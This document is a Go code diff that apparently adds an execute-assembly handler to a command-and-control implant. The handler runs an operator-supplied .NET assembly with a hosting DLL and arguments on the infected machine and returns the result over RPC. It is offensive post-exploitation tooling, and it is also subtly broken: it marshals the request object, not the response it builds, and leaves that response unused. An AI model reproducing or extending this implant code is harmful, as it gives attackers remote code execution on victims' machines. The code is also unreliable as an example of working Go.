@@ -63,3 +63,26 @@ func remoteTaskHandler(data []byte, resp RPCResponse) {
 	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
 	resp([]byte{}, err)
 }
+
+func executeAssemblyHandler(data []byte, resp RPCResponse) {
+	execReq := &pb.ExecuteAssemblyReq{}
+	err := proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	output, err := taskrunner.ExecuteAssembly(execReq.Assembly, execReq.HostingDll, execReq.Arguments)
+	strErr := ""
+	if err != nil {
+		strErr = err.Error()
+	}
+	execResp := &pb.ExecuteAssembly{
+		Output: output,
+		Error:  strErr,
+	}
+	data, err = proto.Marshal(execReq)
+	resp(data, err)
+
+}
